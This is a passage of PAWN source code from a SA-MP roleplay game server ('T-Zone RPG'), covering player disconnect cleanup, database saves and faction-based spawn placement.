						format(string, sizeof(string), "Dispatch: %s has been killed by No One and will be in jail for %d seconds, over.",streap,PlayerInfo[playerid][pJailTime]);
					}
				}
			}
			SendTeamMessage(1, COLOR_LIGHTBLUE, string);
			SendTeamMessage(2, COLOR_LIGHTBLUE, string);
			SendTeamMessage(3, COLOR_LIGHTBLUE, string);
			SendTeamMessage(8, COLOR_LIGHTBLUE, string);
			SendTeamMessage(15, COLOR_LIGHTBLUE, string);
		}
		else if(PlayerInfo[playerid][pWantedLevel] < 1)
		{
			new string[256],sendername[30];
			GetPlayerName(playerid, sendername, sizeof(sendername));
			format(string, sizeof(string), "Unknown");
			strmid(PlayerInfo[playerid][pVictim], string, 0, strlen(string), 255);
			Update(playerid,pVictimx);
			if(strcmp(PlayerInfo[playerid][pCrime1], "Fara Crima", true) == 0)
			{
		    	format(string,sizeof(string),"disconnect during a chase");
				strmid(PlayerInfo[playerid][pCrime1], string, 0, strlen(string), 255);
				Update(playerid,pCrime1x);
			}
			else if(strcmp(PlayerInfo[playerid][pCrime2], "Fara Crima", true) == 0)
			{
		    	format(string,sizeof(string),"disconnect during a chase");
				strmid(PlayerInfo[playerid][pCrime2], string, 0, strlen(string), 255);
				Update(playerid,pCrime2x);
			}
			else if(strcmp(PlayerInfo[playerid][pCrime3], "Fara Crima", true) == 0)
			{
		    	format(string,sizeof(string),"disconnect during a chase");
				strmid(PlayerInfo[playerid][pCrime3], string, 0, strlen(string), 255);
				Update(playerid,pCrime3x);
			}
			else if(strcmp(PlayerInfo[playerid][pCrime1],  "Fara Crima", true) == 0 && strcmp(PlayerInfo[playerid][pCrime2], "Fara Crima", true) == 0 && strcmp(PlayerInfo[playerid][pCrime3], "Fara Crima", true) == 0) { }
			else
			{
				format(string,sizeof(string),"disconnect during a chase");
				strmid(PlayerInfo[playerid][pCrime1], string, 0, strlen(string), 255);
				Update(playerid,pCrime1x);
				format(string, sizeof(string), "Fara Crima");
				strmid(PlayerInfo[playerid][pCrime2], string, 0, strlen(string), 255);
				strmid(PlayerInfo[playerid][pCrime3], string, 0, strlen(string), 255);
				Update(playerid,pCrime2x);
				Update(playerid,pCrime3x);
			}
			format(string, sizeof(string), "Dispatch: %s is now wanted for disconnecting during a chase.",sendername);
			SendTeamMessage(1, COLOR_DBLUE, string);
			SendTeamMessage(2, COLOR_DBLUE, string);
			SendTeamMessage(3, COLOR_DBLUE, string);
			SendTeamMessage(8, COLOR_DBLUE, string);
			SendTeamMessage(15, COLOR_DBLUE, string);
			Update(playerid,pWantedLevelx);
		}
	}
	if(workdeja[playerid] == 1)
	{
	    workdeja[playerid] = 0;
	    DestroyVehicle(pizzacar[playerid]);
	    DisablePlayerRaceCheckpoint(playerid);
		pizzaj[playerid] = 0;
		pizzatime[playerid] = 0;
		failpizza[playerid] = -1;
		PizzaCP[playerid] = 0;
		pizzaprize[playerid] = 0;
		pizzacar[playerid] = -1;
	}
	// PAYDAY SAVE
    if(gPlayerLogged[playerid] != 0)
	{
		OnPlayerDateUpdateX2(playerid);
		Update(playerid, pPayDayx);
		Update(playerid, pPayCheckx);
		Update(playerid, pFpunishx);
		Update(playerid, pConnectTimex);
		Update(playerid, pLawyerx);
		if(sendbankkick[playerid] < 1) { Update(playerid, pBank); }
		Update(playerid, pCashx);
		Update(playerid, pRP);
		Update(playerid, pJailTimex);
		Update(playerid, pGPointsx);
		Update(playerid, pPremiumPointsx);
		Update(playerid, pLevelx);
		Update(playerid, pHTokenx);
		Update(playerid, pGiftTimex);
		Update(playerid, pHiddenColorx);
	}
	pnsmoney[playerid] = 0;
	OnDutymedic[playerid] = 0;
	RepairTime[playerid] = 0;
	Tigaanel[playerid] = 0;
	foreach(Player, i)
	{
		if(IsACop(playerid))
		{
			if(caser[playerid] == i)
			{
				cased[i] --;
				caser[playerid] = 1001;
			}
		}
	}
	cased[playerid] = 0;
	caser[playerid] = 1001;

    if(PlayerInfo[playerid][pMember] > 0)
	{
	    new namex[25],disc[84];
	    GetPlayerName(playerid,namex,sizeof(namex));
	    if(serverrestart2 == -1)
	    {
			switch(reason)
	    	{
	        	case 0: format(disc,sizeof(disc),"%s from your group has disconnected (crash).",namex);
	        	case 1: format(disc,sizeof(disc),"%s from your group has disconnected (quit).",namex);
    			case 2: format(disc,sizeof(disc),"%s from your group has disconnected (banned/kicked).",namex);
	    	}
	    	SendFamilyMessage(PlayerInfo[playerid][pMember], COLOR_GENANNOUNCE, disc);
		}
	}
	if(PlayerInfo[playerid][pAdmin] > 0 || PlayerInfo[playerid][pHelper] > 0)
	{
		new string2[128],namee[30];
		GetPlayerName(playerid, namee, sizeof(namee));
		if(serverrestart2 == -1)
		{
			switch(reason)
			{
				case 0: format(string2, sizeof(string2), "Quitbot: %s left the game (crash).",namee);
				case 1: format(string2, sizeof(string2), "Quitbot: %s left the game (quit).",namee);
				case 2: format(string2, sizeof(string2), "Quitbot: %s left the game (banned/kicked).",namee);
			}
			ABroadCast(COLOR_ADMCHAT, string2,1);
			HLChat(COLOR_ADMCHAT,string2);
		}
	}
	if(PlayerInfo[playerid][pPaintBallG] > 0)
 	{
  		new string [128],sendername[30];
    	GetPlayerName(playerid, sendername, sizeof(sendername));
		foreach(Player, i)
		{
  			if(PlayerInfo[i][pPaintBallG] == PlayerInfo[playerid][pPaintBallG])
	    	{
      			format(string,sizeof(string),"{0066FF}PaintBall: {FFFFFF}%s left paintball arena.", sendername);
	        	SendClientMessage(i, -1, string);
			}
		}
		curatj[playerid] = 0;
		for (new i = 0; i != 5; ++i) { SendDeathMessageToPlayer(playerid, 1001, 1001, 1001); }
		for(new i = 0; i < sizeof(PaintTD); i++) { PlayerTextDrawHide(playerid, PaintTD[i]); }
		SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
		paint_jucatori--;
  		PlayerInfo[playerid][pPaintBallG] = 0;
    	PlayerInfo[playerid][pPaintBallKills] = 0;
     	ResetPlayerWeaponsEx(playerid);
	    ResetPlayerWeapons(playerid);
	    SetPlayerArmourEx(playerid, 0);
	    SetPlayerInterior(playerid, 0);
	    SetPlayerVirtualWorld(playerid,0);
	    SetPlayerToTeamColor(playerid);
	    SetPlayerWorldBounds(playerid, 20000.0000, -20000.0000, 20000.0000, -20000.0000);
	    SetPlayerPos(playerid, 1154.4122,-1440.0548,15.7969);
	}
 	if(PlayerInfo[playerid][pPremiumAccount] == 1)
 	{
 	    if(PlayerInfo[playerid][pColor] >=1)
 	    {
 	    	PlayerInfo[playerid][pColor] = 0;
	  	}
	}

	if(PlayerInfo[playerid][pFlyMode] > 0)
	{
	    SetPlayerHealth(playerid, 100);
		SetPlayerArmour(playerid, 0);
		//StopFly(playerid);
		PlayerInfo[playerid][pFlyMode] = 0;
	}

	if(TakingLesson[playerid] == 1)
	{
		PlayerTextDrawHide(playerid, DMVexam[playerid]);
		PlayerTextDrawHide(playerid, DMVcheck[playerid]);
		DestroyVehicle(examcar[playerid]);
		DisableRemoteVehicleCollisions(playerid, 0);
		examcar[playerid] = -1;
        TakingLesson[playerid] = 0;
	    DisablePlayerRaceCheckpoint(playerid);
	}

	if(AdvPlayer[playerid] != 0)
	{
		secundepanalaad[playerid] = -1;
		AdvPlayer[playerid] = 0;
		format(AdvMSG[playerid], 256, "");
	}
	new qqerry[128];
	mysql_format(SQL,qqerry, sizeof(qqerry), "UPDATE `users` SET `Status` = '0' WHERE `id` = '%d'", PlayerInfo[playerid][pSQLID]);
    mysql_tquery(SQL,qqerry,"","");
	mysql_format(SQL,qqerry, sizeof(qqerry), "UPDATE `friends` SET `Status` = '0' WHERE `FriendID` = '%d'", PlayerInfo[playerid][pSQLID]);
    mysql_tquery(SQL,qqerry,"","");

	DestroyPVehs(playerid);

	if(viddd[playerid] != 0)
	{
	    DestroyVehicle(viddd[playerid]);
	    viddd[playerid] = 0;
	}
    spawnsetarea[playerid] = 0;
	tazer[playerid] = 0;						curatj[playerid] = 0;
	playerdeath[playerid] = 0;					ticketmuie[playerid] = -1;
	bizid[playerid] = 0; 						bizprice[playerid] = 0;
	bizoffer[playerid] = 999;					PlayerInfo[playerid][pSleeping] = 0;
	adminacceptedhelp[playerid] = -1;			DeletePVar(playerid, "Help");
	licenseaccepted[playerid] = -1;				licensesend[playerid] = -1;
	SellgunOffer[playerid] = -1;				SellgunPrice[playerid] = 0;
	SellgunMats[playerid] = 0;					SellgunAmmo[playerid] = 0;
	SellgunID[playerid] = 0;					pizzaj[playerid] = 0;
	requestingevent[playerid] = 0;              pizzatime[playerid] = 0;
	eventorganizer[playerid] = 0;				togfind[playerid] = 0;
    PlayerCuffed2[playerid] = 0;                timerrent[playerid] = 0;
	togip[playerid] = 0;						Clanidoff[playerid] = 999;
	WTToggle[playerid] = false; 				WTChannel[playerid] = 0.0;
	antirem[playerid] = 0; 						workdeja[playerid] = 0;
  	wantedlost[playerid] = 1799;                Trucker[playerid] = 0;
	Diceid[playerid] = 999;                     PlayerHandsup[playerid] = 0;
	Dicem[playerid] = 999; 					 
	TaxiCall[playerid] = -1;					Refueling[playerid] = 0;
 	InHQ[playerid] = -1;						InHouse[playerid] = -1;
	InBussines[playerid] = -1; 					raceoff[playerid] = 999;
	toglc[playerid] = 0;		                voted1[playerid] = -1;
 	voted2[playerid] = -1;                      voted3[playerid] = -1;
    taxim[playerid] = 0;                        pockettime[playerid] = 0;
	somated[playerid] = -1;
	SomatePermission[playerid] = 1;             somatee[playerid] = 1;
	ReportTime[playerid] = 0;                   IsCollectingRubbish[playerid] = 0;
 	hudactivated[playerid] = 0;                 pocketjaf[playerid] = 0;
    Vending[playerid] = 0;                      PlayerInfo[playerid][pFishPrice] = 0;
	FactionOffer[playerid] = 999;               Sunglasses[playerid] = 0;
	Hatss[playerid] = 0;                        TowAcc[playerid] = 0;
	CheckBus[playerid] = 0;                     JobStep[playerid] = 0;
	viddd[playerid] = 0;                        Trucker2[playerid] = 0;
	TruckID[playerid] = 0;                      Trucker3[playerid] = 0;
	Trucker4[playerid] = 0;                     AreFaina[playerid] = 0;
	CarJacker[playerid] = 0;                    JackAcc[playerid] = 0;
	Fishing[playerid] = 0;                      FishTimer[playerid] = 0;
	TipPeste[playerid] = 0;                     SelFac[playerid] = 0;
	omoarathief[playerid] = 0;                  moneyaucutionplayer[playerid] = 0;
	BuyCar[playerid] = -1;                      EnterInModShop[playerid] = 0;
	PlayerInfo[playerid][pHelpedPlayers] = 0;   DMGadmin[playerid] = 0;
	PlayerInfo[playerid][pNMuted] = 0;          ticketgivened[playerid] = 0;
	PlayerInfo[playerid][pNRE] = -1;            masinispawnate[playerid] = 0;
	WantedPoints[playerid] = 0;                 PlayerInfo[playerid][pJailTime] = 0;
	PlayerInfo[playerid][pJailed] = 0;

	KillTimer(soexpire[playerid]);
    //KillTimer(timerfree1[playerid]);
	PlayerTextDrawHide(playerid, UndercoverText[playerid]);
	PlayerTextDrawHide(playerid, HUD[1][playerid]);
	PlayerTextDrawHide(playerid, HUD[2][playerid]);
	PlayerTextDrawHide(playerid, HUD[3][playerid]);
	PlayerTextDrawHide(playerid, Reportss[playerid]);
	PlayerTextDrawHide(playerid, RentCar[playerid]);
	PlayerTextDrawHide(playerid, WantedText[playerid]);
	for(new i = 0; i < sizeof(WarTD); i++) { PlayerTextDrawHide(playerid, WarTD[i]); }
	if(RentVeh[playerid] != -1)
	{
		VehicleRent[RentVeh[playerid]] = -1;
		RentTime[playerid] = 0;
		TotalTimeRent[playerid] = 0;
		KillTimer(RentTimerr[playerid]);
		RentVeh[playerid] = -1;
	}

    RemovePlayerAttachedObject(playerid,0);
    RemovePlayerAttachedObject(playerid,1);
    RemovePlayerAttachedObject(playerid,2);
    RemovePlayerAttachedObject(playerid,3);
    RemovePlayerAttachedObject(playerid,4);

    if(HireCar[playerid] > 0)
    {
  		new engine,lights,alarm,doors,bonnet,boot,objective;
    	gCarLock[HireCar[playerid]] = 0;
     	GetVehicleParamsEx(HireCar[playerid],engine,lights,alarm,doors,bonnet,boot,objective);
     	SetVehicleParamsEx(HireCar[playerid],engine,lights,alarm,0,bonnet,boot,objective);
      	vehEngine[HireCar[playerid]] = 0;
       	GetVehicleParamsEx(HireCar[playerid],engine,lights,alarm,doors,bonnet,boot,objective);
		SetVehicleParamsEx(HireCar[playerid],VEHICLE_PARAMS_OFF,lights,alarm,doors,bonnet,boot,objective);
		HireCar[playerid] = -1;
  		SetVehicleToRespawn(HireCar[playerid]);
  		timerrent[playerid] = 0;
	}

	// HITMAN
	if(GotHit[playerid] > 0)
	{
	    if(GetChased[playerid] < 999)
	    {
	        if(IsPlayerConnected(GetChased[playerid]))
	        {
	        	SendClientMessage(GetChased[playerid], COLOR_YELLOW, "Your hit has left the server.");
	            GoChase[GetChased[playerid]] = 999;
		        togfind[GetChased[playerid]] = 0;
		        PlayerInfo[GetChased[playerid]][pHitT] = 0;
				new string[124];
				mysql_format(SQL, string, sizeof(string), "UPDATE users SET `HitT`='%d' WHERE `name`='%s'", PlayerInfo[GetChased[playerid]][pHitT], PlayerInfo[GetChased[playerid]][pNormalName]);
		        mysql_tquery(SQL,string,"","");
			}
	    }
	}
	if(GoChase[playerid] != 999)
	{
		GotHit[GoChase[playerid]] = 0;
		GetChased[GoChase[playerid]] = 999;
		GoChase[playerid] = 999;
	}
	GetChased[playerid] = 999;					 GotHit[playerid] = 0;

	// TIMER MONEY
	KillTimer(TimerAtuPlayer[playerid]);

	// LAST LOGIN
	new y,m,d,h,mi,sec;
	getdate(y,m,d);
	gettime(h,mi,sec);
	new str[184];
	mysql_format(SQL,str,sizeof(str), "UPDATE users SET `lastOn`='%d-%02d-%02d %02d:%02d:%02d' WHERE `name`='%s'",y,m,d,h,mi,sec,PlayerInfo[playerid][pNormalName]);
	mysql_tquery(SQL,str,"","");

	// MESAJ DECONECTARE
 	new wakaname2[25],
		string2[64];
	GetPlayerName(playerid, wakaname2, sizeof(wakaname2));
	if(serverrestart2 == -1)
 	{
		switch(reason)
    	{
   			case 0: format(string2,sizeof(string2),"%s has timed out from the server (crash).",wakaname2);
   			case 1: format(string2,sizeof(string2),"%s has left the server.",wakaname2);
   			case 2: format(string2,sizeof(string2),"%s has been kicked or banned from the server.",wakaname2);
    	}
    	ProxDetector(20.0, playerid, string2, COLOR_GENANNOUNCE,COLOR_GENANNOUNCE,COLOR_GENANNOUNCE,COLOR_GENANNOUNCE,COLOR_GENANNOUNCE);
	}
	// TAXI
	foreach(Player,i)
	{
		if(IsPlayerConnected(Mobile[playerid]))
		{
			if(Mobile[playerid] != -1)
			{
				CellTime[Mobile[playerid]] = 0;
				CellTime[playerid] = 0;
				Mobile[Mobile[playerid]] = -1;
				SetPlayerSpecialAction(Mobile[playerid],SPECIAL_ACTION_STOPUSECELLPHONE);
				Mobile[playerid] = -1;
				PlayerInfo[playerid][pSpeaker] = 0;
				SetPlayerSpecialAction(playerid,SPECIAL_ACTION_STOPUSECELLPHONE);
			}
		}
		if(targetfind[i] == playerid)
		{
		    targetfind[i] = -1;
		    UsedFind[i] = 0;
		    DisablePlayerCheckpoint(i);
	        GameTextForPlayer(i, "~r~Your target left the game.", 5000, 1);
			if(IsACop(i))
			{
				if(caser[i] == playerid)
				{
					caser[i] = 0;
				}
			}
		}
	    if(TaxiAccepted[i] < 999)
        {
	        if(TaxiAccepted[i] == playerid)
	        {
	            TaxiAccepted[i] = 999;
	            GameTextForPlayer(i, "~w~Taxi Caller~n~~r~~h~Left the game", 5000, 1);
	            TaxiCallTime[i] = 0;
	            DisablePlayerCheckpoint(i);
	        }
        }
	}
	if(TransportCost[playerid] > 0 && TransportDriver[playerid] < 999)
	{
	    if(IsPlayerConnected(TransportDriver[playerid]))
		{
		    new string[256],sendername[30],giveplayer[30];
		    GetPlayerName(playerid,sendername,sizeof(sendername));
		    GetPlayerName(TransportDriver[playerid],giveplayer,sizeof(giveplayer));
		    TransportMoney[TransportDriver[playerid]] += TransportCost[playerid];
		    TransportTime[TransportDriver[playerid]] = 0;
		    TransportCost[TransportDriver[playerid]] = 0;
		    format(string, sizeof(string), "~w~Passenger left~n~~g~Earned $%d",TransportCost[playerid]);
		    GameTextForPlayer(TransportDriver[playerid], string, 5000, 1);
		    format(string, sizeof(string), "# %s gets off the cab and pays $%s to %s.",sendername,FormatNumber(TransportCost[playerid]),giveplayer);
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		}
	}

	// TRANSPORT DUTY / JOB DUTY
    if(TransportDuty[playerid] == 1)
	{
		TaxiDrivers -= 1;
	}
	if(PlayerInfo[playerid][pJob] == 5)
	{
	    if(JobDuty[playerid] == 1) { Medics -= 1; }
	}
	else if(PlayerInfo[playerid][pJob] == 8)
	{
	    if(JobDuty[playerid] == 1) { Mechanics -= 1; }
	}
    return 1;
}

public SetPlayerSpawn(playerid)
{
	if(IsPlayerConnected(playerid))
	{
		InHouse[playerid] = -1;
		InBussines[playerid] = -1;
		InHQ[playerid] = -1;
		if(MP3ON[playerid] == 0) StopAudioStreamForPlayer(playerid);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
	    if(PlayerInfo[playerid][pTut] == 0)
	    {
			gOoc[playerid] = 1; gNews[playerid] = 1; gFam[playerid] = 1;
			TogglePlayerControllable(playerid, 0);
			RegistrationStep[playerid] = 1;
			new sendername[30],stringy[128];
			GetPlayerName(playerid, sendername,  sizeof(sendername));
			SendClientMessage(playerid, COLOR_TEAL, "----------------------------------------------------------------------------");
			format(stringy,sizeof(stringy),"Welcome to T-Zone RPG, %s.", sendername);
			SendClientMessage(playerid, COLOR_YELLOW, stringy);
			SetPlayerInterior(playerid,0);
			SetPlayerVirtualWorld(playerid, 9994);
			SetPlayerPosEx(playerid, 1597.3927,-2218.0688,23.6551);
			ShowPlayerDialog(playerid, DIALOG_REGISTER, DIALOG_STYLE_MSGBOX, "Language", "Zaban Bazi Khod Ra Entekhab Konid.\nChoose the language that you speak.", "Persian", "English");
			return 1;
		}
		new rand,
			house = PlayerInfo[playerid][pPhousekey];
		if(PlayerInfo[playerid][pPaintBallG] > 0)
		{
			SetPlayerVirtualWorld(playerid, 69);
			if(T_SAU_CT[playerid] == 2)
			{
				SetPlayerSkin(playerid, 285);
				GivePlayerWeaponEx(playerid, 24, 999);
				GivePlayerWeaponEx(playerid, 27, 999);
				GivePlayerWeaponEx(playerid, 31, 999);
				GivePlayerWeaponEx(playerid, 29, 999);
				SetPlayerPosEx(playerid, pozitie_tero[random(17)][0], pozitie_tero[random(17)][1], pozitie_tero[random(17)][2]);
			}
			if(T_SAU_CT[playerid] == 1)
			{
				SetPlayerSkin(playerid, 1);
				GivePlayerWeaponEx(playerid, 24, 999);
				GivePlayerWeaponEx(playerid, 25, 999);
				GivePlayerWeaponEx(playerid, 30, 999);
				GivePlayerWeaponEx(playerid, 28, 999);
				SetPlayerPosEx(playerid, pozitie_ctero[random(17)][0], pozitie_ctero[random(17)][1], pozitie_ctero[random(17)][2]);
			}	
			if(incamerapaintball[playerid] > 1) 
			{
				incamerapaintball[playerid] = 1;
				TogglePlayerControllable(playerid, 0);
			}
			if(paint_incepe < 0 && paint_jucatori > 1)
			{
				PlayerTextDrawHide(playerid, PaintTD[1]);
				PlayerTextDrawSetString(playerid, PaintTD[3], "OMOARA_JUCATORII_DIN_ECHIPA_ADVERSA");
				PlayerTextDrawShow(playerid, PaintTD[0]);
				PlayerTextDrawShow(playerid, PaintTD[8]);
				PlayerTextDrawShow(playerid, PaintTD[2]);
				PlayerTextDrawShow(playerid, PaintTD[3]);
				AscundeTD[playerid] = 8;
			}
			return 1;
		}
		if(BeforeSpectate[playerid][pSpectating])
  		{
   			SetPlayerVirtualWorld(playerid, BeforeSpectate[playerid][pWorld]);
   			SetPlayerInterior(playerid, BeforeSpectate[playerid][pInt]);

   			if(BeforeSpectate[playerid][pState] == PLAYER_STATE_DRIVER)
    		PutPlayerInVehicleEx(playerid, BeforeSpectate[playerid][pInVehicle], 0);

   			else if(BeforeSpectate[playerid][pState] == PLAYER_STATE_PASSENGER)
    			PutPlayerInVehicleEx(playerid, BeforeSpectate[playerid][pInVehicle], 1 + random(3));

   			else
    			SetPlayerPos(playerid, BeforeSpectate[playerid][pOldPos][0], BeforeSpectate[playerid][pOldPos][1], BeforeSpectate[playerid][pOldPos][2]);

   			BeforeSpectate[playerid][pSpectating] = false;
   			return 1;
  		}
		if(PlayerInfo[playerid][pJailed] == 1)
		{
			SetPlayerWantedLevel(playerid, 0);
			DestroyDynamic3DTextLabel(WantedScris[playerid]);
			PlayerTextDrawHide(playerid, WantedText[playerid]);
			SetPlayerInterior(playerid, 6);
			rand = random(sizeof(gRandomJailSpawns));
			SetPlayerPosEx(playerid,gRandomJailSpawns[rand][0],gRandomJailSpawns[rand][1],gRandomJailSpawns[rand][2]);
			TogglePlayerControllable(playerid, 0);
			SetTimerEx("UnFreezeStation", 1000, false, "i", playerid);
			if(PlayerInfo[playerid][pVirtualPD] == 3)
			{
			    SetPlayerVirtualWorld(playerid, 3);
			}
			else
			{
			    SetPlayerVirtualWorld(playerid, 0);
			}
			return 1;
		}
		if(PlayerInfo[playerid][pJailed] == 2)
		{
			DestroyDynamic3DTextLabel(WantedScris[playerid]);
			PlayerTextDrawHide(playerid, WantedText[playerid]);
			SetPlayerInterior(playerid, 10);
			rand = random(sizeof(gRandomAJailSpawns));
			SetPlayerPosEx(playerid,gRandomAJailSpawns[rand][0],gRandomAJailSpawns[rand][1],gRandomAJailSpawns[rand][2]);
			TogglePlayerControllable(playerid, 0);
			SetTimerEx("UnFreezeStation", 1000, false, "i", playerid);
			return 1;
		}
		if(house == 999)
  		{
			if(PlayerInfo[playerid][pRented] > 0)
			{
				house = PlayerInfo[playerid][pRented];
			}
  		}
		if(PlayerInfo[playerid][pSpawnChange] == 2 && PlayerInfo[playerid][pPhousekey2] != 999)
		{
			house = PlayerInfo[playerid][pPhousekey2];
			SetPlayerToTeamColor(playerid);
			SetPlayerInterior(playerid,HouseInfo[house][hInterior]);
			SetPlayerPosEx(playerid, HouseInfo[house][hExitx], HouseInfo[house][hExity],HouseInfo[house][hExitz]);
            SetPlayerVirtualWorld(playerid, HouseInfo[house][hVirtual]);
			PlayerInfo[playerid][pLocal] = house;
			PlayerInfo[playerid][pInt] = HouseInfo[house][hInterior];
			InHouse[playerid] = house;
			if(strlen(housestring[InHouse[playerid]]) > 0)
			{
    			if(MP3ON[playerid] == 0) StopAudioStreamForPlayer(playerid);
				PlayAudioStreamForPlayer(playerid, housestring[InHouse[playerid]]);
			}
			return 1;
		}
		if(house != 999)
		{
		    if(PlayerInfo[playerid][pSpawnChange] == 1)
		    {
				SetPlayerToTeamColor(playerid);
				SetPlayerInterior(playerid,HouseInfo[house][hInterior]);
				SetPlayerPosEx(playerid, HouseInfo[house][hExitx], HouseInfo[house][hExity],HouseInfo[house][hExitz]);
                SetPlayerVirtualWorld(playerid, HouseInfo[house][hVirtual]);
				PlayerInfo[playerid][pLocal] = house;
				PlayerInfo[playerid][pInt] = HouseInfo[house][hInterior];
				InHouse[playerid] = house;
				if(strlen(housestring[InHouse[playerid]]) > 0)
				{
    				if(MP3ON[playerid] == 0) StopAudioStreamForPlayer(playerid);
					PlayAudioStreamForPlayer(playerid, housestring[InHouse[playerid]]);
				}
				return 1;
			}
		}
		if (PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pLeader] == 1) // LSPD
		{
			SetPlayerToTeamColor(playerid);
			SetPlayerPosEx(playerid, 246.7732,65.1425,1003.6406);
			SetPlayerFacingAngle(playerid, 270.0);
			SetPlayerInterior(playerid,6);
			PlayerInfo[playerid][pInt] = 6;
			return 1;
	    }
	    if(spawnsetarea[playerid] == 1)
	    {
	        SetPlayerInterior(playerid,15);
  			SetPlayerPosEx(playerid,-1423.5153,935.8321,1036.4756);
			PlayerInfo[playerid][pInt] = 15;
	    }
		if (PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pLeader] == 2) // FBI
		{
		    SetPlayerToTeamColor(playerid);
		    SetPlayerInterior(playerid, 3);
		    SetPlayerPosEx(playerid, 230.0687,165.1646,1003.0234);
		    PlayerInfo[playerid][pInt] = 3;
			InHQ[playerid] = 2;
		    return 1;
		}
		if (PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3) // NG
		{
		    SetPlayerToTeamColor(playerid);
		    SetPlayerInterior(playerid, 0);
		    SetPlayerPosEx(playerid, 213.8154,1866.6807,13.1406);
		    PlayerInfo[playerid][pInt] = 0;
		    return 1;
		}
		if (PlayerInfo[playerid][pMember] == 4 || PlayerInfo[playerid][pLeader] == 4) // Los Aztecas
		{
		    SetPlayerToTeamColor(playerid);
		    SetPlayerInterior(playerid, 6);
		    SetPlayerPosEx(playerid, 774.213989,-48.924297,1000.585937);
		    PlayerInfo[playerid][pInt] = 6;
		    SetPlayerVirtualWorld(playerid, 1);
			InHQ[playerid] = 4;
			if(PlayerInfo[playerid][pGunLic] == 1)
			{
				GivePlayerWeaponEx(playerid, 24, 50);
			}
		    return 1;
		}
		if (PlayerInfo[playerid][pMember] == 5 || PlayerInfo[playerid][pLeader] == 5) // Grove Street
		{
		    SetPlayerToTeamColor(playerid);
		    SetPlayerPosEx(playerid,2496.049804,-1695.238159,1014.742187);
		    SetPlayerInterior(playerid, 3);
		    PlayerInfo[playerid][pInt] = 3;
			InHQ[playerid] = 5;
			if(PlayerInfo[playerid][pGunLic] == 1)
			{
				GivePlayerWeaponEx(playerid, 24, 50);
			}
			SetPlayerVirtualWorld(playerid,393);
		    return 1;
		}
		if (PlayerInfo[playerid][pMember] == 6 || PlayerInfo[playerid][pLeader] == 6) // Los Vagos
		{
		    SetPlayerToTeamColor(playerid);
		    SetPlayerInterior(playerid, 12);
		    SetPlayerPosEx(playerid, 2324.4199,-1145.5684,1050.7101);
		    PlayerInfo[playerid][pInt] = 12;
			InHQ[playerid] = 6;
			if(PlayerInfo[playerid][pGunLic] == 1)
			{
				GivePlayerWeaponEx(playerid, 24, 50);
			}
			SetPlayerVirtualWorld(playerid,1);
		    return 1;
		}
	    if (PlayerInfo[playerid][pMember] == 8 || PlayerInfo[playerid][pLeader] == 8) // Tow Car Company
	    {
	        SetPlayerToTeamColor(playerid);
			SetPlayerPosEx(playerid, 246.8886,64.7381,1003.6406);
			SetPlayerInterior(playerid,6);
			PlayerInfo[playerid][pInt] = 6;
			InHQ[playerid] = 8;
			SetPlayerVirtualWorld(playerid, 3);
	        return 1;
	    }
	    if (PlayerInfo[playerid][pMember] == 15 || PlayerInfo[playerid][pLeader] == 15) // Tow Car Company
	    {
	        SetPlayerToTeamColor(playerid);
			SetPlayerPosEx(playerid, 246.8886,64.7381,1003.6406);
			SetPlayerInterior(playerid,6);
			PlayerInfo[playerid][pInt] = 6;
			InHQ[playerid] = 15;
			SetPlayerVirtualWorld(playerid, 1015);
	        return 1;
	    }
	    if (PlayerInfo[playerid][pMember] == 9 || PlayerInfo[playerid][pLeader] == 9) // News Reporter
	    {
	        SetPlayerToTeamColor(playerid);
			SetPlayerPosEx(playerid, -2027.0515,-104.5211,1035.1719);
			SetPlayerInterior(playerid,3);
			PlayerInfo[playerid][pInt] = 3;
			GivePlayerWeaponEx(playerid,43,50);
			InHQ[playerid] = 9;
	        return 1;
	    }
	    if (PlayerInfo[playerid][pMember] == 10 || PlayerInfo[playerid][pLeader] == 10) // Ballas
	    {
	        SetPlayerToTeamColor(playerid);
			SetPlayerPosEx(playerid, 964.106994,-53.205497,1001.124572);
			SetPlayerInterior(playerid,3);
			PlayerInfo[playerid][pInt] = 3;
			InHQ[playerid] = 10;
			if(PlayerInfo[playerid][pGunLic] == 1)
			{
				GivePlayerWeaponEx(playerid, 24, 50);
			}
	        return 1;
	    }
	    if (PlayerInfo[playerid][pMember] == 11 || PlayerInfo[playerid][pLeader] == 11) // Hitman
	    {
	        SetPlayerToTeamColor(playerid);
			SetPlayerPosEx(playerid, 2323.9993,-1148.0469,1050.7101);
			SetPlayerInterior(playerid,12);
			PlayerInfo[playerid][pInt] = 12;
			InHQ[playerid] = 11;
			SetPlayerVirtualWorld(playerid, 2);
	        return 1;
	    }
	    if (PlayerInfo[playerid][pMember] == 12 || PlayerInfo[playerid][pLeader] == 12) // SI
	    {
	        SetPlayerToTeamColor(playerid);
			SetPlayerPosEx(playerid,1494.325195,1304.942871,1093.289062);
			SetPlayerInterior(playerid,3);
			PlayerInfo[playerid][pInt] = 3;
			SetPlayerVirtualWorld(playerid, 3);
			InHQ[playerid] = 12;
	        return 1;
	    }
	    if (PlayerInfo[playerid][pMember] == 13 || PlayerInfo[playerid][pLeader] == 13) // LS TAXI
	    {
	        SetPlayerToTeamColor(playerid);
			SetPlayerPosEx(playerid,1700.9830,-1667.8865,20.2188);
			SetPlayerInterior(playerid,18);
			PlayerInfo[playerid][pInt] = 18;
			SetPlayerVirtualWorld(playerid, 5);
			InHQ[playerid] = 13;
	        return 1;
	    }
	    if (PlayerInfo[playerid][pMember] == 14 || PlayerInfo[playerid][pLeader] == 14) // Paramedic
	    {
	        SetPlayerToTeamColor(playerid);
			SetPlayerPosEx(playerid,1494.325195,1304.942871,1093.289062);
			SetPlayerInterior(playerid,3);
			PlayerInfo[playerid][pInt] = 3;
			SetPlayerVirtualWorld(playerid, 7);
			InHQ[playerid] = 14;
	        return 1;
	    }
	    if (PlayerInfo[playerid][pMember] == 0 || PlayerInfo[playerid][pLeader] == 0) // Civilian
	    {
	        new randomspawn = 1 + random(7);
	        if(randomspawn == 1 || randomspawn == 8)
			{
				SetPlayerPosEx(playerid, 364.0286,-2077.6917,7.8661);
			}
			if(randomspawn == 2 || randomspawn == 7)
			{
